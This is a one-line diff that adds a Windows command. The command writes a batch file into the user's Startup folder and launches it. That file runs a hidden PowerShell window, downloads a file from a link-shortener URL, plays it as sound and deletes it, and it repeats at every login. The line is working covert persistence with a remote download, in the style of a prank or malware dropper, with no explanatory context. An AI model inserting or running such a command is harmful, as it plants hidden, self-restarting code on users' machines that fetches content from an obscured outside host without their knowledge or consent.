@@ -1,0 +1,1 @@
+echo powershell -w h -c "$f=\"$env:TEMP\f.wav\";iwr https://is.gd/meWiC4 -o $f;(New-Object Media.SoundPlayer $f).PlaySync();del $f">"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\a.bat" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\a.bat"
